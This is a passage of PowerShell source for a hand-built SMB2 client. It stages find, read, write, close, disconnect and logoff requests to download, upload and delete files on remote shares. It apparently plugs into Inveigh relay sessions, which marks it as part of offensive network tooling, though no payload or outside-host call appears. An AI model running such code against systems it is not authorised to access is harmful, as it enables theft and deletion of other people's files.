                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB2_message_ID++
                    $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                    }
                    else
                    {
                        $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                    }

                    $packet_SMB2b_data = New-PacketSMB2FindRequestFile $SMB_file_ID
                    $packet_SMB2b_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                    $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2b_header + $SMB2b_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2b_header["Signature"] = $SMB2_signature
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($Action -eq 'Get' -and $action_step -eq 1)
                    {
                        $find_response = [System.BitConverter]::ToString($SMB_client_receive)
                        $find_response = $find_response -replace "-",""
                        $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))
                        $file_unicode = $file_unicode -replace "-",""
                        $file_size_index = $find_response.IndexOf($file_unicode) - 128
                        $file_size = [System.BitConverter]::ToUInt32($SMB_client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)
                        $action_step++
                        $create_request_extra_info = 1
                        $SMB_client_stage = 'CreateRequest'

                        if($share_subdirectory -eq $file)
                        {
                            $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($file)
                        }
                        else
                        {
                            $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                        }

                    }
                    else
                    {
                        $SMB_client_stage = 'ParseDirectoryContents'
                    }

                }
                
                'CloseRequest'
                {

                    if(!$SMB_file_ID)
                    {
                        $SMB_file_ID = $SMB_client_receive[132..147]
                    }

                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }
    
                    $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_file_ID = ''

                    if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')
                    {
                        $SMB2_file = $directory_list[0]
                        $root_directory = $SMB2_file + 0x5c,0x00
                        $create_request_extra_info = 1
                        $SMB_client_stage = 'CreateRequest'

                        if($root_directory.Count -gt 2)
                        {
                            $root_directory_extract = [System.BitConverter]::ToString($root_directory)
                            $root_directory_extract = $root_directory_extract -replace "-00",""

                            if($root_directory.Length -gt 2)
                            {
                                $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)
                            }
                            else
                            {
                                $root_directory_string = [Char][System.Convert]::ToInt16($SMB2_file,16)
                            }

                        }

                    }
                    elseif($Action -eq 'Get' -and $action_step -eq 1)
                    {

                        if($share_subdirectory -eq $source_file)
                        {
                            $SMB2_file = ""
                        }
                        else
                        {
                            $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                        }

                        $create_request_extra_info = 1
                        $SMB_client_stage = 'CreateRequest'
                    }
                    elseif($Action -eq 'Delete')
                    {
                        
                        switch($action_step)
                        {

                            0
                            {

                                if($share_subdirectory -eq $source_file)
                                {
                                    $SMB2_file = ""
                                }
                                else
                                {
                                    $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                                }

                                $create_request_extra_info = 1
                                $SMB_client_stage = 'CreateRequest'
                                $action_step++

                            }

                            1
                            {
                                $SMB_client_stage = 'CreateRequestFindRequest'
                            }

                            3
                            {
                                $SMB_client_stage = 'TreeDisconnect'
                            }

                        }

                    }
                    elseif($share_subdirectory_start)
                    {
                        $share_subdirectory_start = $false
                        $SMB_client_stage = 'CreateRequestFindRequest'
                    }
                    else
                    {
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                }

                'ReadRequest'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_header["CreditCharge"] = 0x01,0x00
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2ReadRequest $read_request_length $read_request_offset $SMB_file_ID
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    Start-Sleep -m 5

                    if($read_request_length -eq 65536)
                    {
                        $i = 0

                        while($SMB_client.Available -lt 8192 -and $i -lt 10)
                        {
                            Start-Sleep -m $Sleep
                            $i++
                        }

                    }
                    else
                    {
                        Start-Sleep -m $Sleep
                    }
                    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($Action -eq 'Get' -and $action_step -eq 3)
                    {
                        $action_step++
                        $create_request_extra_info = 1
                        $SMB_client_stage = 'CreateRequest'
                    }
                    elseif($Action -eq 'Get' -and $action_step -eq 7)
                    {

                        if(!$NoProgress)
                        {
                            $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)
                            Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                        }

                        $file_bytes = $SMB_client_receive[84..($read_request_length + 83)]
 
                        if(!$Modify)
                        {

                            if(!$file_write)
                            {
                                $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'
                            }

                            $file_write.Write($file_bytes,0,$file_bytes.Count)
                        }
                        else
                        {
                            $file_memory.AddRange($file_bytes)
                        }

                        if($read_request_step -lt $file_stream_size_quotient)
                        {
                            $read_request_offset+=65536
                            $read_request_step++
                            $SMB_client_stage = 'ReadRequest'
                        }
                        elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)
                        {
                            $read_request_length = $file_stream_size_remainder
                            $read_request_offset+=65536
                            $read_request_step++
                            $SMB_client_stage = 'ReadRequest'
                        }
                        else
                        {

                            if(!$Modify)
                            {
                                $file_write.Close()
                            }
                            else
                            {
                                $file_memory.ToArray()
                            }

                            $output_message = "[+] File downloaded"
                            $SMB_client_stage = 'CloseRequest'
                        }
                        
                    }
                    elseif([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                    {
                        $SMB_client_stage = 'CloseRequest'
                    }
                    else
                    {
                        $SMB_client_stage = 'CloseRequest'
                    }

                }

                'WriteRequest'
                {

                    if(!$Modify)
                    {
                        $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null
                        $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null
                    }
                    else
                    {
                        $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]
                    }

                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_header["CreditCharge"] = 0x01,0x00
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }
                    
                    $packet_SMB2_data = New-PacketSMB2WriteRequest $write_request_length $write_request_offset $SMB_file_ID $source_file_buffer
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($write_request_step -lt $source_file_size_quotient)
                    {

                        if(!$NoProgress)
                        {
                            $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)
                            Write-Progress -Activity "[*] Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                        }

                        $write_request_offset+=65536
                        $write_request_step++
                        $SMB_client_stage = 'WriteRequest'
                    }
                    elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)
                    {
                        $write_request_length = $source_file_size_remainder
                        $write_request_offset+=65536
                        $write_request_step++
                        $SMB_client_stage = 'WriteRequest'
                    }
                    else
                    {
                        $action_step++
                        $set_info_request_file_info_class = 0x01
                        $set_info_request_info_level = 0x04
                        $set_info_request_buffer = $source_file_creation_time +
                                                    $source_file_last_access_time +
                                                    $source_file_last_write_time +
                                                    $source_file_last_change_time + 
                                                    0x00,0x00,0x00,0x00,
                                                    0x00,0x00,0x00,0x00

                        if(!$Modify)
                        {
                            $SMB_client_stage = 'SetInfoRequest'
                        }
                        else
                        {
                            $output_message = "[+] File uploaded from memory"
                            $SMB_client_stage = 'CloseRequest'
                        }

                    }

                }

                'TreeDisconnect'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }
        
                    $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($inveigh_session -and !$Logoff)
                    {
                        $SMB_client_stage = 'Exit'
                    }
                    else
                    {
                        $SMB_client_stage = 'Logoff'
                    }

                }

                'Logoff'
                {
                    $SMB2_message_ID += 20
                    $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }
        
                    $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'Exit'
                }

            }
        
        }

    }

    }
    finally
    {  

        if($file_write.Handle)
        {
            $file_write.Close()
        }

        if($source_file_stream.Handle)
        {
            $source_file_binary_reader.Close()
            $source_file_stream.Close()
        }

        if($inveigh_session -and $Inveigh)
        {
            $inveigh.session_lock_table[$session] = 'open'
            $inveigh.session_message_ID_table[$session] = $SMB2_message_ID
            $inveigh.session_list[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
        }

        if(!$inveigh_session -or $Logoff)
        {
            $SMB_client.Close()
            $SMB_client_stream.Close()
        }

    }

}

    if(!$Modify -or $Action -eq 'Put')
    {
        Write-Output $output_message
    }
    elseif($output_message)
    {
        Write-Verbose $output_message
    }

}